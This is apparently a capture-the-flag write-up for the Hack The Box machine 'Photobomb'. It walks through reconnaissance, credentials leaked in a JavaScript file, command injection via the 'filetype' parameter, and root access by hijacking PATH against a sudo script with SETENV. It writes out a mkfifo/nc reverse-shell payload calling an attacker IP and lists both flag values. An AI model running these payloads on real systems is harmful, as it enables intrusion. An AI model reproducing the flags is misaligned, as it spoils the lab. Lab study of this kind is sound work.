# Photobomb - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.11.182

sudo vim /etc/hosts
#map ip to photobomb.htb

feroxbuster -u http://photobomb.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

#inject the reverse shell code
#in filetype parameter
#setup listener
nc -nvlp 4444

#we get reverse shell
whoami
#wizard

ls -la

sudo -l

cat /opt/cleanup.sh
#uses find binary

#in home directory
echo "/bin/bash" > find

chmod +x find

sudo PATH=$PWD:$PATH /opt/cleanup.sh
#we get root shell

id
#root
```

* Open ports & services:

  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - nginx 1.18.0

* Edit /etc/hosts and include the domain photobomb.htb mapped to the victim IP.

* We can start enumerating for web directories while exploring webpage on port 80.

* We need creds for basic authentication to access the /printer page.

* We do not get any hidden directories, but we can take a look at /photobomb.js

* The script contains the name 'Jameson', and creds pH0t0:b0Mb! for /printer

* Accessing /printer using these creds gives us a page with photos; we can download these images as JPG or PNG and in different dimensions.

* Also, on accessing any other non-existing page such as /printer/robots.txt, we get the message "Sinatra doesn't know this ditty"; this means the webpage is using Sinatra (written in Ruby).

* In the source code for /printer, the title says 'JPGs work on most printers, but some people think PNGs give better quality'.

* We can experiment with JPGs and PNGs and intercept the request in Burp Suite.

* The intercepted request contains the following query at bottom:

    photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png&dimensions=3000x2000

* On trying injection in the query for different parameters - it does not work for 'photo' and 'dimensions', but it works for 'filetype':

    photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;whoami&dimensions=3000x2000

* Concatenating any command after the filetype and trying to inject gives us a response which fails to generate a copy of the photo.

* We can insert reverse-shell code after the filetype parameter and setup our listener; after we URL-encode the injected code and send the intercepted request, we get shell:

    photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=png;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.7 4444 >/tmp/f&dimensions=3000x2000

* We can run '/opt/cleanup.sh' as root without any password; furthermore, it has SETENV set:

    ```(root) SETENV: NOPASSWD: /opt/cleanup.sh```

* The script uses the binary 'find'; we can create a find binary in our home directory, which just calls bash shell.

* On running the script with sudo and path, we get root shell.

```markdown
1. User flag - 3374cce22e3c309fb4b87ed252ea8cfd

2. Root flag - 8f0b1f51dedb63e5472834d5c37ff8d6
```
